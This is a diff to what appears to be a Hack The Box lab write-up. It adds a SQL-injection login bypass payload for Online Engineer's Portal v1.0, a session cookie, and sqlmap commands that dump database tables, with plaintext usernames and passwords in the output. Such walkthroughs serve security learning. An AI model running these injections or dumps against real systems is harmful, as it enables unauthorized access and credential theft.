@@ -148,7 +148,7 @@ https://github.com/berdav/CVE-2021-4034
 
 <img src=img/webportal.png>
 
-5. sql injection auth bypass in online engineer's portal v1.0
+5. auth bypass via sql injection in online engineer's portal v1.0 login form
 
 *refer to https://www.exploit-db.com/exploits/50452
 
@@ -156,6 +156,37 @@ bypass the login form authentication with sql payloads as follow:
 
             username:' OR '1'='1';-- -
             password:anystring
+            
+grab the session cookie: PHPSESSID=t8gbu5ql720ib9l0ke9di9h9lp
+
+6. reveal user credentials via sql vuln in 'id' parameter of /quiz_question.php
+
+*refer to *refer to https://www.exploit-db.com/exploits/50453
+
+            $sqlmap -u "http://webportal.engineer.htb/quiz_question.php?id=*" --cookie="PHPSESSID=t8gbu5ql720ib9l0ke9di9h9lp" --batch --dbs --> reveal database name(capstone)
+            $sqlmap -u "http://webportal.engineer.htb/quiz_question.php?id=*" --cookie="PHPSESSID=t8gbu5ql720ib9l0ke9di9h9lp" --batch --tables -D capstone --> reveal interesting tables 'teacher' and 'users'
+            $sqlmap -u "http://webportal.engineer.htb/quiz_question.php?id=*" --cookie="PHPSESSID=t8gbu5ql720ib9l0ke9di9h9lp" --batch --dump -D capstone -T teacher
+            Database: capstone
+            Table: teacher
+            [4 entries]
+            +------------+---------------+---------+-----------+--------------------------------+---------------------+----------+--------------+-------------+--------------+----------------+
+            | teacher_id | department_id | about   | lastname  | location                       | password            | username | firstname    | status_line | teacher_stat | teacher_status |
+            +------------+---------------+---------+-----------+--------------------------------+---------------------+----------+--------------+-------------+--------------+----------------+
+            | 30         | 4             | <blank> | Escoto    | uploads/NO-IMAGE-AVAILABLE.jpg | ralphthelegend      | ralph    | Ralph        | 1           | <blank>      | Registered     |
+            | 28         | 4             | <blank> | Hipolito  | uploads/NO-IMAGE-AVAILABLE.jpg | tomandjerry         | tom      | Rustom       | 1           | <blank>      | Registered     |
+            | 29         | 4             | <blank> | Trinidad  | uploads/NO-IMAGE-AVAILABLE.jpg | jezmusic            | jez      | Jezreel Driz | 1           | <blank>      | Registered     |
+            | 34         | 4             | <blank> | Bonifacio | uploads/NO-IMAGE-AVAILABLE.jpg | andresrevolutionary | andres   | Andres       | 1           | <blank>      | Registered     |
+            +------------+---------------+---------+-----------+--------------------------------+---------------------+----------+--------------+-------------+--------------+----------------+
+            
+            $sqlmap -u "http://webportal.engineer.htb/quiz_question.php?id=*" --cookie="PHPSESSID=t8gbu5ql720ib9l0ke9di9h9lp" --batch --dump -D capstone -T users
+            Database: capstone
+            Table: users
+            [1 entry]
+            +---------+----------+----------------------+----------+-----------+
+            | user_id | lastname | password             | username | firstname |
+            +---------+----------+----------------------+----------+-----------+
+            | 15      | Craze    | youshallnotcrackthis | admin    | Cyber     |
+            +---------+----------+----------------------+----------+-----------+
 
 6. rce via uploading avatar
 
